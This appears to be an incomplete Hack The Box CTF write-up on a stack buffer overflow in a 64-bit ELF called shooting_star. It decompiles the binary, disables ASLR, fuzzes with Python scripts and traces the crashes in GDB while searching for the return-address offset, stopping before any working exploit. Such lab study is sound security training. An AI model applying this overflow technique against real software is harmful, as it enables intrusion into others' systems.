# Shooting star Write up

We are very screwed, but here we go! Check file.

# File analysis

```shell
file shooting_star                                                                                                                   main 
shooting_star: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=78179254768c1362423b4d4b124ff480b059febe, for GNU/Linux 3.2.0, not stripped
```

Execute file:  
```shell
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                      main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> be happy

May your wish come true!
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                26   main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> happiness and health for my daughter

May your wish come true!
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                26   main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 2
Isn't the sky amazing?!
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                24   main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 3
A star is an astronomical object consisting of a luminous spheroid of plasma held together by its own gravity. The nearest star to Earth is the Sun. Many other stars are visible to the naked eye from Earth during the night, appearing as a multitude of fixed luminous points in the sky due to their immense distance from Earth. Historically, the most prominent stars were grouped into constellations and asterisms, the brightest of which gained proper names. Astronomers have assembled star catalogues that identify the known stars and provide standardized stellar designations.
 …  hackthebox  ShootingStar  Files          
```

After take a look con ghidra code, we are interesting on buffer overflow from star function (option 1: Make a wish)
```python
void star(void)

{
  char local_4a [2];
  undefined local_48 [64];
  
  read(0,local_4a,2);
  if (local_4a[0] == '1') {
    write(1,&DAT_00402008,3);
    read(0,local_48,0x200);
    write(1,"\nMay your wish come true!\n",0x1a);
  }
  else if (local_4a[0] == '2') {
    write(1,"Isn\'t the sky amazing?!\n",0x18);
  }
  else if (local_4a[0] == '3') {
    write(1,
          "A star is an astronomical object consisting of a luminous spheroid of plasma held togethe r by its own gravity. The nearest star to Earth is the Sun. Many other stars are visible t o the naked eye from Earth during the night, appearing as a multitude of fixed luminous po ints in the sky due to their immense distance from Earth. Historically, the most prominent  stars were grouped into constellations and asterisms, the brightest of which gained prope r names. Astronomers have assembled star catalogues that identify the known stars and prov ide standardized stellar designations.\n"
          ,0x242);
  }
  return;
}
```

We'll try to overflow undefined local_48 [64]; on read.

# Disabling ASLR
As before, we don't want the added complexity of Address Space Layout Randomization for this project, so we'll turn it off.
In a Terminal window, execute this command: 

```shell
echo 0 > /proc/sys/kernel/randomize_va_space 
```
# Making a Python Fuzzer
There a lot of ways/tools to create patterns, search offsets, but for now we want to do it step by step following this way.
Create python fuzz.py script ass follow. First print 1 menu option and after print A *150 lenght since array is 64 lenght
```python
#!/usr/bin/python
print (1)
print ('A' * 150)
```

Give executable and redirect output to file:

```shell
chmod a+x fuzz
./fuzz > f 
```

Execute binary shooting_star redirect f as input,  The program crashes with a "Segmentation fault", as shown below. 
```shell
./shooting_star < f                                                                                                                                                              main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> >> 
May your wish come true!
Segmentation fault (core dumped)
```

# Debugging the Program
In a Terminal window, execute these commands (we have installed and configured Peda assistance for GDB, you can do it without it).
The program stops with a "Segmentation fault", as shown below. 

```shell
gdb ./shooting_star 
gdb-peda$ r < f
[----------------------------------registers-----------------------------------]
RAX: 0x1a
RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1a
RSI: 0x40200c ("\nMay your wish come true!\n")
RDI: 0x1
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
RIP: 0x4011ec (<star+170>:	ret)
R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x202
R12: 0x0
R13: 0x7fffffffe5b8 --> 0x7fffffffe912 ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011e5 <star+163>:	call   0x401030 <write@plt>
   0x4011ea <star+168>:	nop
   0x4011eb <star+169>:	leave
=> 0x4011ec <star+170>:	ret
   0x4011ed <setup>:	push   rbp
   0x4011ee <setup+1>:	mov    rbp,rsp
   0x4011f1 <setup+4>:	mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
   0x4011f8 <setup+11>:	mov    ecx,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
0008| 0x7fffffffe490 ('A' <repeats 70 times>, "\n")
0016| 0x7fffffffe498 ('A' <repeats 62 times>, "\n")
0024| 0x7fffffffe4a0 ('A' <repeats 54 times>, "\n")
0032| 0x7fffffffe4a8 ('A' <repeats 46 times>, "\n")
0040| 0x7fffffffe4b0 ('A' <repeats 38 times>, "\n")
0048| 0x7fffffffe4b8 ('A' <repeats 30 times>, "\n")
0056| 0x7fffffffe4c0 ('A' <repeats 22 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ec in star ()
gdb-peda$
```
In gdb, execute "info registers" command.  At the crash, rbp contains 0x4141414141414141, as shown below. 
```shell
gdb-peda$ info registers
rax            0x1a                0x1a
rbx            0x7fffffffe5a8      0x7fffffffe5a8
rcx            0x7ffff7ea20b4      0x7ffff7ea20b4
rdx            0x1a                0x1a
rsi            0x40200c            0x40200c
rdi            0x1                 0x1
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffe488      0x7fffffffe488
r8             0x4012d0            0x4012d0
r9             0x7ffff7fce890      0x7ffff7fce890
r10            0x3                 0x3
r11            0x202               0x202
r12            0x0                 0x0
r13            0x7fffffffe5b8      0x7fffffffe5b8
r14            0x0                 0x0
r15            0x7ffff7ffd000      0x7ffff7ffd000
rip            0x4011ec            0x4011ec <star+170>
eflags         0x10203             [ CF IF RF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
gdb-peda$
```
# Examining 64-Bit Stack Frames
On 32-bit systems, we'd control the eip at this point, but on a 64-bit system, we only control rbp, and rip remains at a sensible value.
To understand this, let's examine the stack.

In gdb, execute "disassemble star" command. 
As highlighted below, the "read" instruction that causes the buffer overflow is at star+77:

```shell
gdb-peda$ disassemble star
Dump of assembler code for function star:
   0x0000000000401142 <+0>:	push   rbp
   0x0000000000401143 <+1>:	mov    rbp,rsp
   0x0000000000401146 <+4>:	sub    rsp,0x50
   0x000000000040114a <+8>:	lea    rax,[rbp-0x42]
   0x000000000040114e <+12>:	mov    edx,0x2
   0x0000000000401153 <+17>:	mov    rsi,rax
   0x0000000000401156 <+20>:	mov    edi,0x0
   0x000000000040115b <+25>:	call   0x401040 <read@plt>
   0x0000000000401160 <+30>:	movzx  eax,BYTE PTR [rbp-0x42]
   0x0000000000401164 <+34>:	cmp    al,0x31
   0x0000000000401166 <+36>:	jne    0x4011ac <star+106>
   0x0000000000401168 <+38>:	mov    edx,0x3
   0x000000000040116d <+43>:	lea    rsi,[rip+0xe94]        # 0x402008
   0x0000000000401174 <+50>:	mov    edi,0x1
   0x0000000000401179 <+55>:	call   0x401030 <write@plt>
   0x000000000040117e <+60>:	lea    rax,[rbp-0x40]
   0x0000000000401182 <+64>:	mov    edx,0x200
   0x0000000000401187 <+69>:	mov    rsi,rax
   0x000000000040118a <+72>:	mov    edi,0x0
   0x000000000040118f <+77>:	call   0x401040 <read@plt>
   0x0000000000401194 <+82>:	mov    edx,0x1a
   0x0000000000401199 <+87>:	lea    rsi,[rip+0xe6c]        # 0x40200c
   0x00000000004011a0 <+94>:	mov    edi,0x1
   0x00000000004011a5 <+99>:	call   0x401030 <write@plt>
   0x00000000004011aa <+104>:	jmp    0x4011ea <star+168>
   0x00000000004011ac <+106>:	movzx  eax,BYTE PTR [rbp-0x42]
   0x00000000004011b0 <+110>:	cmp    al,0x32
   0x00000000004011b2 <+112>:	jne    0x4011cc <star+138>
   0x00000000004011b4 <+114>:	mov    edx,0x18
   0x00000000004011b9 <+119>:	lea    rsi,[rip+0xe67]        # 0x402027
   0x00000000004011c0 <+126>:	mov    edi,0x1
   0x00000000004011c5 <+131>:	call   0x401030 <write@plt>
   0x00000000004011ca <+136>:	jmp    0x4011ea <star+168>
   0x00000000004011cc <+138>:	movzx  eax,BYTE PTR [rbp-0x42]
   0x00000000004011d0 <+142>:	cmp    al,0x33
   0x00000000004011d2 <+144>:	jne    0x4011ea <star+168>
   0x00000000004011d4 <+146>:	mov    edx,0x242
   0x00000000004011d9 <+151>:	lea    rsi,[rip+0xe60]        # 0x402040
   0x00000000004011e0 <+158>:	mov    edi,0x1
   0x00000000004011e5 <+163>:	call   0x401030 <write@plt>
   0x00000000004011ea <+168>:	nop
   0x00000000004011eb <+169>:	leave
   0x00000000004011ec <+170>:	ret
End of assembler dump.
gdb-peda$
```
In gdb, execute these commands to put a breakpoint before the overflow and re-run the program:
break * star+77
run < f

```shell
gdb-peda$ break * star+77
Breakpoint 1 at 0x40118f
gdb-peda$ run < f
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe440 --> 0x7ffff7f846a0 --> 0xfbad2087
RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x200
RSI: 0x7fffffffe440 --> 0x7ffff7f846a0 --> 0xfbad2087
RDI: 0x0
RBP: 0x7fffffffe480 --> 0x7fffffffe490 --> 0x1
RSP: 0x7fffffffe430 --> 0x7ffff7f80540 --> 0x0
RIP: 0x40118f (<star+77>:	call   0x401040 <read@plt>)
R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x202
R12: 0x0
R13: 0x7fffffffe5b8 --> 0x7fffffffe912 ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401182 <star+64>:	mov    edx,0x200
   0x401187 <star+69>:	mov    rsi,rax
   0x40118a <star+72>:	mov    edi,0x0
=> 0x40118f <star+77>:	call   0x401040 <read@plt>
   0x401194 <star+82>:	mov    edx,0x1a
   0x401199 <star+87>:	lea    rsi,[rip+0xe6c]        # 0x40200c
   0x4011a0 <star+94>:	mov    edi,0x1
   0x4011a5 <star+99>:	call   0x401030 <write@plt>
Guessed arguments:
arg[0]: 0x0
arg[1]: 0x7fffffffe440 --> 0x7ffff7f846a0 --> 0xfbad2087
arg[2]: 0x200
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe430 --> 0x7ffff7f80540 --> 0x0
0008| 0x7fffffffe438 --> 0xa317ffff7e286ee
0016| 0x7fffffffe440 --> 0x7ffff7f846a0 --> 0xfbad2087
0024| 0x7fffffffe448 --> 0x7ffff7e201d1 (<setvbuf+241>:	cmp    rax,0x1)
0032| 0x7fffffffe450 --> 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
0040| 0x7fffffffe458 --> 0x7fffffffe480 --> 0x7fffffffe490 --> 0x1
0048| 0x7fffffffe460 --> 0x0
0056| 0x7fffffffe468 --> 0x7fffffffe5b8 --> 0x7fffffffe912 ("SHELL=/bin/bash")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040118f in star ()
gdb-peda$
```
In gdb, execute these commands to see the $rsp and $rbp:
```shell
gdb-peda$ x $rsp
0x7fffffffe440:	0x00007ffff7f80540
gdb-peda$ x $rbp
0x7fffffffe490:	0x00007fffffffe4a0
gdb-peda$
```
In gdb, execute this command to see the stack frame:
```shell
gdb-peda$ x/60x $rsp
0x7fffffffe430:	0x00007ffff7f80540	0x0a317ffff7e286ee
0x7fffffffe440:	0x00007ffff7f846a0	0x00007ffff7e201d1
0x7fffffffe450:	0x00007fffffffe5a8	0x00007fffffffe480
0x7fffffffe460:	0x0000000000000000	0x00007fffffffe5b8
0x7fffffffe470:	0x00007fffffffe5a8	0x00007ffff7ffe2c0
0x7fffffffe480:	0x00007fffffffe490	0x000000000040125e
0x7fffffffe490:	0x0000000000000001	0x00007ffff7dce290
0x7fffffffe4a0:	0x00007fffffffe590	0x0000000000401230
0x7fffffffe4b0:	0x0000000100400040	0x00007fffffffe5a8
0x7fffffffe4c0:	0x00007fffffffe5a8	0x2aac75c2f08f07f4
0x7fffffffe4d0:	0x0000000000000000	0x00007fffffffe5b8
0x7fffffffe4e0:	0x0000000000000000	0x00007ffff7ffd000
0x7fffffffe4f0:	0xd5538a3d39cd07f4	0xd5539a7b340507f4
0x7fffffffe500:	0x0000000000000000	0x0000000000000000
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x00007fffffffe5b8	0x854fb257fe3c0300
0x7fffffffe530:	0x0000000000000000	0x00007ffff7dce34a
0x7fffffffe540:	0x0000000000401230	0x00007fff00000000
0x7fffffffe550:	0x0000000000000000	0x0000000000000000
0x7fffffffe560:	0x0000000000000000	0x0000000000401060
0x7fffffffe570:	0x00007fffffffe5a0	0x0000000000000000
0x7fffffffe580:	0x0000000000000000	0x000000000040108a
0x7fffffffe590:	0x00007fffffffe598	0x0000000000000038
0x7fffffffe5a0:	0x0000000000000001	0x00007fffffffe8c4
0x7fffffffe5b0:	0x0000000000000000	0x00007fffffffe912
0x7fffffffe5c0:	0x00007fffffffe922	0x00007fffffffe97a
0x7fffffffe5d0:	0x00007fffffffe98e	0x00007fffffffe9a5
0x7fffffffe5e0:	0x00007fffffffe9ce	0x00007fffffffe9e2
0x7fffffffe5f0:	0x00007fffffffe9f8	0x00007fffffffea07
0x7fffffffe600:	0x00007fffffffea4b	0x00007fffffffea5a
gdb-peda$
```
The highlighted portion of the image below is the stack frame, ending at the 64-bit word beginning at $rbp (0x7fffffffe490). The 64 bits after the stack frame contain the return value, which is outlined in green in the image below.
When the function returns, the return value is popped into $rip, so the program can resume execution of the calling function. 

In gdb, execute these commands, to execute the "read" instruction and view the stack frame again.
```shell
gdb-peda$ nexti
[----------------------------------registers-----------------------------------]
RAX: 0x97
RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea2011 (<read+17>:	cmp    rax,0xfffffffffffff000)
RDX: 0x200
RSI: 0x7fffffffe440 ('A' <repeats 150 times>, "\n")
RDI: 0x0
RBP: 0x7fffffffe480 ('A' <repeats 86 times>, "\n")
RSP: 0x7fffffffe430 --> 0x7ffff7f80540 --> 0x0
RIP: 0x401194 (<star+82>:	mov    edx,0x1a)
R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x246
R12: 0x0
R13: 0x7fffffffe5b8 --> 0x7fffffffe912 ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401187 <star+69>:	mov    rsi,rax
   0x40118a <star+72>:	mov    edi,0x0
   0x40118f <star+77>:	call   0x401040 <read@plt>
=> 0x401194 <star+82>:	mov    edx,0x1a
   0x401199 <star+87>:	lea    rsi,[rip+0xe6c]        # 0x40200c
   0x4011a0 <star+94>:	mov    edi,0x1
   0x4011a5 <star+99>:	call   0x401030 <write@plt>
   0x4011aa <star+104>:	jmp    0x4011ea <star+168>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe430 --> 0x7ffff7f80540 --> 0x0
0008| 0x7fffffffe438 --> 0xa317ffff7e286ee
0016| 0x7fffffffe440 ('A' <repeats 150 times>, "\n")
0024| 0x7fffffffe448 ('A' <repeats 142 times>, "\n")
0032| 0x7fffffffe450 ('A' <repeats 134 times>, "\n")
0040| 0x7fffffffe458 ('A' <repeats 126 times>, "\n")
0048| 0x7fffffffe460 ('A' <repeats 118 times>, "\n")
0056| 0x7fffffffe468 ('A' <repeats 110 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000401194 in star ()
gdb-peda$
gdb-peda$
gdb-peda$ x/180x $rsp
0x7fffffffe430:	0x40	0x05	0xf8	0xf7	0xff	0x7f	0x00	0x00
0x7fffffffe438:	0xee	0x86	0xe2	0xf7	0xff	0x7f	0x31	0x0a
0x7fffffffe440:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe448:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe450:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe458:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe460:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe468:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe470:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe478:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe480:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe488:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe490:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe498:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4a8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4b0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4b8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4c0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4c8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe4d0:	0x41	0x41	0x41	0x41	0x41	0x41	0x0a	0x00
0x7fffffffe4d8:	0xb8	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe4e0:	0x00	0x00	0x00	0x00
gdb-peda$
```
As shown, the return value now contains 0x4141414141414141 on $rbp (0x7fffffffe490)

# Understanding the Crash
In gdb, execute these commands, to see the instruction that causes the crash.
    continue
    x/3i $rip
As shown below, the program crashes when executing the last instruction in the star() function--"retq"

```shell
gdb-peda$ continue
[----------------------------------registers-----------------------------------]
RAX: 0x1a
RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1a
RSI: 0x40200c ("\nMay your wish come true!\n")
RDI: 0x1
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
RIP: 0x4011ec (<star+170>:	ret)
R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x202
R12: 0x0
R13: 0x7fffffffe5b8 --> 0x7fffffffe912 ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011e5 <star+163>:	call   0x401030 <write@plt>
   0x4011ea <star+168>:	nop
   0x4011eb <star+169>:	leave
=> 0x4011ec <star+170>:	ret
   0x4011ed <setup>:	push   rbp
   0x4011ee <setup+1>:	mov    rbp,rsp
   0x4011f1 <setup+4>:	mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
   0x4011f8 <setup+11>:	mov    ecx,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
0008| 0x7fffffffe490 ('A' <repeats 70 times>, "\n")
0016| 0x7fffffffe498 ('A' <repeats 62 times>, "\n")
0024| 0x7fffffffe4a0 ('A' <repeats 54 times>, "\n")
0032| 0x7fffffffe4a8 ('A' <repeats 46 times>, "\n")
0040| 0x7fffffffe4b0 ('A' <repeats 38 times>, "\n")
0048| 0x7fffffffe4b8 ('A' <repeats 30 times>, "\n")
0056| 0x7fffffffe4c0 ('A' <repeats 22 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ec in star ()
gdb-peda$

gdb-peda$ x/3i $rip
=> 0xa414141:	Cannot access memory at address 0xa414141

=> 0x4011ec <star+170>:	ret
   0x4011ed <setup>:	push   rbp
   0x4011ee <setup+1>:	mov    rbp,rsp
gdb-peda$

```

The "retq" instruction pops the return value from the stack and puts it into rip.
In 32-bit stack overflows, the value "AAAA" would be copied into $eip, and the program would crash on the next instruction, because that address is not available to the program.
But on a 64-bit system, the processor can't even put a value like 0x4141414141414141 into $rip, because they don't actually allow all possible addresses. 

The current AMD specifications for a so-called "64-bit" processor uses only 48 address bits, so there are two allowed regions of address space, as shown below: 
![64bit](IMG/p13-64bo14.png)

# Targeting the Return Value
So we can't just use AAAAAAAA--we need to insert an allowed value into the return pointer.
The first step is to find which eight bytes from the attack control the return value.
To do that, we'll send a series of numbers instead of 'A' characters.

Create find.py python script as follow:
```python
#!/usr/bin/python

attack = 'A' * 150

for i in range(0,5):
   for j in range(0,10):
      attack += str(i) + str(j)

print (1)
print (attack)
```

Now, save output with the same procedure we executed with fuzz:
```shell
$./find                                                                                                                            
1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849
$./find > f
```

# Debugging the Program
Now execute on gdb as follow:
```shell
gdb ./shotting_star
gdb-peda$ run < f 
[----------------------------------registers-----------------------------------]
RAX: 0x1a
RBX: 0x7fffffffe5b8 --> 0x7fffffffe8dc ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1a
RSI: 0x40200c ("\nMay your wish come true!\n")
RDI: 0x1
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe498 ('A' <repeats 78 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
RIP: 0x4011ec (<star+170>:	ret)
R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x202
R12: 0x0
R13: 0x7fffffffe5c8 --> 0x7fffffffe92a ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011e5 <star+163>:	call   0x401030 <write@plt>
   0x4011ea <star+168>:	nop
   0x4011eb <star+169>:	leave
=> 0x4011ec <star+170>:	ret
   0x4011ed <setup>:	push   rbp
   0x4011ee <setup+1>:	mov    rbp,rsp
   0x4011f1 <setup+4>:	mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
   0x4011f8 <setup+11>:	mov    ecx,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 ('A' <repeats 78 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0008| 0x7fffffffe4a0 ('A' <repeats 70 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0016| 0x7fffffffe4a8 ('A' <repeats 62 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0024| 0x7fffffffe4b0 ('A' <repeats 54 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0032| 0x7fffffffe4b8 ('A' <repeats 46 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0040| 0x7fffffffe4c0 ('A' <repeats 38 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0048| 0x7fffffffe4c8 ('A' <repeats 30 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
0056| 0x7fffffffe4d0 ('A' <repeats 22 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ec in star ()
gdb-peda$
gdb-peda$ 
gdb-peda$ nexti
[----------------------------------registers-----------------------------------]
RAX: 0xfb
RBX: 0x7fffffffe5b8 --> 0x7fffffffe8dc ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea2011 (<read+17>:	cmp    rax,0xfffffffffffff000)
RDX: 0x200
RSI: 0x7fffffffe450 ('A' <repeats 150 times>, "00010203040506070809101112131415161718192021222324"...)
RDI: 0x0
RBP: 0x7fffffffe490 ('A' <repeats 86 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
RSP: 0x7fffffffe440 --> 0x7ffff7f80540 --> 0x0
RIP: 0x401194 (<star+82>:	mov    edx,0x1a)
R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x246
R12: 0x0
R13: 0x7fffffffe5c8 --> 0x7fffffffe92a ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401187 <star+69>:	mov    rsi,rax
   0x40118a <star+72>:	mov    edi,0x0
   0x40118f <star+77>:	call   0x401040 <read@plt>
=> 0x401194 <star+82>:	mov    edx,0x1a
   0x401199 <star+87>:	lea    rsi,[rip+0xe6c]        # 0x40200c
   0x4011a0 <star+94>:	mov    edi,0x1
   0x4011a5 <star+99>:	call   0x401030 <write@plt>
   0x4011aa <star+104>:	jmp    0x4011ea <star+168>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe440 --> 0x7ffff7f80540 --> 0x0
0008| 0x7fffffffe448 --> 0xa317ffff7e286ee
0016| 0x7fffffffe450 ('A' <repeats 150 times>, "00010203040506070809101112131415161718192021222324"...)
0024| 0x7fffffffe458 ('A' <repeats 142 times>, "0001020304050607080910111213141516171819202122232425262728"...)
0032| 0x7fffffffe460 ('A' <repeats 134 times>, "000102030405060708091011121314151617181920212223242526272829303132"...)
0040| 0x7fffffffe468 ('A' <repeats 126 times>, "00010203040506070809101112131415161718192021222324252627282930313233343536"...)
0048| 0x7fffffffe470 ('A' <repeats 118 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940"...)
0056| 0x7fffffffe478 ('A' <repeats 110 times>, "000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000401194 in star ()
gdb-peda$
```

Now remember we had at the beginning the following values as rsp and rbp:

```shell
gdb-peda$ x $rsp
0x7fffffffe440:	0x00007ffff7f80540
gdb-peda$ x $rbp
0x7fffffffe490:	0x00007fffffffe4a0
gdb-peda$
```

Take a look on the stack frame, which ends at old $rbp address value (0x7fffffffe490), as shown below.
The last two 32-bit words on 0x7fffffffe490 are the return value (0x0040125e 0x00000000):

```shell
gdb-peda$ x/120wx 0x7fffffffe440
0x7fffffffe440:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe450:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe460:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe470:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe480:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe490:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe4a0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe4b0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe4c0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe4d0:	0x41414141	0x30304141	0x32303130	0x34303330
0x7fffffffe4e0:	0x36303530	0x38303730	0x30313930	0x32313131
